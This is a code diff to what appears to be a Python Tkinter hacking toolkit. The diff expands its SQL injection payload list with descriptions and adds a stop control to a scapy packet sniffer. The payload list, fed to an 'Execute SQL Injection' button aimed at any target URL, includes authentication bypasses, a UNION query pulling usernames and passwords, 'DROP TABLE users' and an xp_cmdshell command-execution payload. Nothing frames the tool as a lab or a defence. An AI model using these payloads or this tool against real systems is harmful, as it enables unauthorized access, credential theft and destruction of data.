@@ -21,13 +21,60 @@ TOOL_DESCRIPTIONS = {
 }
 
 sql_injection_payloads = [
-    "' OR '1'='1'; -- ",
-    "' OR 1=1; -- ",
-    "' OR 'a'='a",
-    "') OR ('a'='a",
-    "'; WAITFOR DELAY '0:0:5' --",
-    "' AND 1=CONVERT(INT, (SELECT @@version)); --",
+    {
+        "payload": "' OR '1'='1'; -- ",
+        "description": "Always true condition (1=1) to bypass authentication.",
+    },
+    {
+        "payload": "' OR 1=1; -- ",
+        "description": "Always true condition (1=1) to bypass authentication.",
+    },
+    {
+        "payload": "' OR 'a'='a",
+        "description": "Always true condition ('a'='a) to bypass authentication.",
+    },
+    {
+        "payload": "') OR ('a'='a",
+        "description": "Always true condition ('a'='a) to bypass authentication.",
+    },
+    {
+        "payload": "'; WAITFOR DELAY '0:0:5' --",
+        "description": "SQL injection with a delay to detect blind SQL injection.",
+    },
+    {
+        "payload": "' AND 1=CONVERT(INT, (SELECT @@version)); --",
+        "description": "Convert version information to an integer.",
+    },
+    {
+        "payload": "UNION ALL SELECT NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
+        "description": "Union-based SQL injection with null values in columns.",
+    },
+    {
+        "payload": "'; DROP TABLE users; --",
+        "description": "Attempt to drop the 'users' table.",
+    },
+    {
+        "payload": "' OR EXISTS(SELECT * FROM information_schema.tables WHERE table_name = 'users'); --",
+        "description": "Check if the 'users' table exists.",
+    },
+    {
+        "payload": "' OR 1=1 UNION SELECT username, password FROM users; --",
+        "description": "Union-based SQL injection to retrieve usernames and passwords.",
+    },
+    {
+        "payload": "'; EXEC xp_cmdshell('dir'); --",
+        "description": "Execute the 'dir' command on the server (for MS SQL Server).",
+    },
+    {
+        "payload": "' UNION SELECT NULL, NULL, @@version, NULL, NULL, NULL, NULL, NULL, NULL, NULL --",
+        "description": "Retrieve the database version.",
+    },
+    {
+        "payload": "' OR 1=CAST((SELECT @@version) AS INT); --",
+        "description": "Attempt to cast the version information to an integer.",
+    },
 ]
+
 
 
 # Function to create a tool frame
@@ -170,10 +217,11 @@ def create_network_sniffer_tool(tool_frame):
     packet_list = []
 
     def packet_capture(packet):
-        packet_info = f"Packet: {packet.summary()}\n"
-        packet_list.append(packet_info)
-        output_text.insert(tk.END, packet_info)
-        output_text.see(tk.END)
+        if not stop_sniffing_flag:
+            packet_info = f"Packet: {packet.summary()}\n"
+            packet_list.append(packet_info)
+            output_text.insert(tk.END, packet_info)
+            output_text.see(tk.END)
 
     def start_sniffing():
         nonlocal packet_list
@@ -182,7 +230,9 @@ def create_network_sniffer_tool(tool_frame):
         save_to_file = save_checkbox_var.get()
 
         def sniff_thread():
-            sniff(prn=packet_capture, store=False)
+            global stop_sniffing_flag
+            stop_sniffing_flag = False  # Reset the flag
+            sniff(prn=packet_capture, store=False, stop_filter=lambda x: stop_sniffing_flag)
 
         if hasattr(tool_frame, 'sniff_thread') and tool_frame.sniff_thread.is_alive():
             return
@@ -196,6 +246,9 @@ def create_network_sniffer_tool(tool_frame):
         stop_button.configure(state=tk.NORMAL)
 
     def stop_sniffing():
+        global stop_sniffing_flag
+        stop_sniffing_flag = True
+
         if hasattr(tool_frame, 'sniff_thread') and tool_frame.sniff_thread.is_alive():
             tool_frame.sniff_thread.join(timeout=1)
 
@@ -211,6 +264,7 @@ def create_network_sniffer_tool(tool_frame):
     save_checkbox_var = IntVar()
     save_checkbox = Checkbutton(tool_frame, text="Save to File", variable=save_checkbox_var)
     save_checkbox.pack()
+
 
 
 # Function to authenticate access
@@ -249,20 +303,48 @@ def create_info_label(tool_frame, info_text):
     info_label.pack(padx=10, pady=10)
 
 
+def create_red_label(parent, text, pady=0):
+    label = ttk.Label(parent, text=text, foreground="red", wraplength=380)
+    label.pack(pady=pady)
+    return label
+
+
 # Function to create the SQL Injection Tool
 def create_sql_injection_tool(tool_frame):
     create_label(tool_frame, "SQL Injection Tool", font=("Helvetica", 16), pady=10)
     target_label = create_label(tool_frame, "Target URL:")
     target_entry = create_entry(tool_frame, 50)
     payload_label = create_label(tool_frame, "SQL Payload:")
-    payload_combo = ttk.Combobox(tool_frame, values=sql_injection_payloads, width=50)
+
+    # Create a StringVar to store the selected payload description
+    selected_payload_description = tk.StringVar()
+
+    payload_combo = ttk.Combobox(tool_frame, values=[payload["payload"] for payload in sql_injection_payloads],
+                                 width=50)
     payload_combo.pack()
+
+    # Create and update the payload description label
+    description_label = create_red_label(tool_frame, "", pady=5)
+    description_label.config(textvariable=selected_payload_description)
+
     result_label = create_label(tool_frame, "Result:")
     result_text = create_scrolled_text(tool_frame, tk.WORD, 60, 10, padx=10, pady=10)
 
+    # Function to update the selected payload's description
+    def update_payload_description(event):
+        selected_payload = payload_combo.get()
+        payload_index = next(
+            (i for i, payload in enumerate(sql_injection_payloads) if payload["payload"] == selected_payload), -1)
+        if payload_index != -1:
+            selected_payload_description.set(sql_injection_payloads[payload_index]["description"])
+        else:
+            selected_payload_description.set("")
+
+    # Bind the update_payload_description function to the payload combo box
+    payload_combo.bind("<<ComboboxSelected>>", update_payload_description)
+
     create_button(tool_frame, "Execute SQL Injection",
                   lambda: execute_sql_injection(target_entry.get(), payload_combo.get(), result_text))
-
 
 # Main application setup
 app = tk.Tk()
